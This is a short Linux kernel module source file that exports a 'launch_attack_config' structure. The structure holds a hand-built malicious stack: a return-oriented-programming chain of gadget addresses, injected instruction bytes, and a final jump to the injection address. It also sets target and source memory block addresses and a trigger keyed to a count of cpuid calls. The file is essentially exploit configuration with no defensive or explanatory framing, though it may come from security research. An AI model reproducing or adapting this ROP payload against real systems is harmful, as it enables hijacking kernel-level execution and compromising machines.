#include <linux/launch-attack.h>
#include <linux/module.h>

uint64_t __tmp[5] = {0x8ca60,0xbc660,0xf1d10,0x106830,0x95420};


uint8_t __mal_stack[] = {
0xd0, 0x1a, 0xfd, 0xff, 0x00, 0x00, 0x00, 0x00, //addr first rop pop gadget
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //used as injection addr
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //unused
//
0x21, 0xef, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00, //addr second pop rop gadget
0x48, 0x8b, 0x45, 0x00, 0x50, 0xf4, 0x00, 0x00, //payload injected with rop move; dont inverse order!
0xe6, 0xfd, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00, //addr move rop gadget
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //unused
0x60, 0x04, 0xfd, 0xff, 0x00, 0x00, 0x00, 0x00, //select which data gets copied by injected mov gadget
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //unused
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //addr for final ret; jump to injection addr
};

launch_attack_config_t launch_attack_config = {
    .target_block = 0x34c460,
    .source_blocks = __tmp,
    .source_blocks_len = 5,
    .target_cpuid_call_count = 16,
    .current_cpuid_call_count = 0,
    .malicious_stack_content = __mal_stack,
    .malicious_stack_content_len = sizeof(__mal_stack)/sizeof(uint8_t),
    .active = true,
};
EXPORT_SYMBOL(launch_attack_config);
